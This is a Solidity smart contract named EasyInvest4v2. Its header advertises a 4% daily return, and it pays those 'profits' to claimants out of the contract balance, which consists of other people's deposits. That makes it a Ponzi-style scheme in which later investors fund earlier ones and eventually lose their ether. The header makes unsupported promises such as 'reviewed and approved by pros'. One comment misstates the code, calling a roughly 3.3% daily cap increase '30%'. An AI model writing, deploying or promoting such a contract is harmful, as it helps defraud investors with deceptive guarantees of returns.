1 pragma solidity ^0.4.25;
2 
3 /**
4  *
5  * Easy Investment Contract
6  *  - GAIN 4% PER 24 HOURS
7  *  - NO COMMISSION on your investment (every ether stays on contract's balance)
8  *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)
9  *  - Rapid growth PROTECTION. The balance of the contract can not grow faster than 30% of the total investment every day
10  *
11  * How to use:
12  *  1. Send any amount of ether to make an investment
13  *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)
14  *  OR
15  *  2b. Send more ether to reinvest AND get your profit at the same time
16  *
17  * RECOMMENDED GAS LIMIT: 200000
18  * RECOMMENDED GAS PRICE: https://ethgasstation.info/
19  *
20  * Contract reviewed and approved by pros!
21  *
22  */
23 contract EasyInvest4v2 {
24 
25     // records amounts invested
26     mapping (address => uint) public invested;
27     // records timestamp at which investments were made
28     mapping (address => uint) public dates;
29 
30     // records amount of all investments were made
31     uint public totalInvested;
32     // records the total allowable amount of investment. 50 ether to start
33     uint public canInvest = 50 ether;
34     // time of the update of allowable amount of investment
35     uint public refreshTime = now + 24 hours;
36 
37     // this function called every time anyone sends a transaction to this contract
38     function () external payable {
39         // if sender (aka YOU) is invested more than 0 ether
40         if (invested[msg.sender] != 0) {
41             // calculate profit amount as such:
42             // amount = (amount invested) * 4% * (time since last transaction) / 24 hours
43             uint amount = invested[msg.sender] * 4 * (now - dates[msg.sender]) / 100 / 24 hours;
44 
45             // if profit amount is not enough on contract balance, will be sent what is left
46             if (amount > address(this).balance) {
47                 amount = address(this).balance;
48             }
49 
50             // send calculated amount of ether directly to sender (aka YOU)
51             msg.sender.transfer(amount);
52         }
53 
54         // record new timestamp
55         dates[msg.sender] = now;
56 
57         // every day will be updated allowable amount of investment
58         if (refreshTime <= now) {
59             // investment amount is 30% of the total investment
60             canInvest += totalInvested / 30;
61             refreshTime += 24 hours;
62         }
63 
64         if (msg.value > 0) {
65             // deposit cannot be more than the allowed amount
66             require(msg.value <= canInvest);
67             // record invested amount of this transaction
68             invested[msg.sender] += msg.value;
69             // update allowable amount of investment and total invested
70             canInvest -= msg.value;
71             totalInvested += msg.value;
72         }
73     }
74 }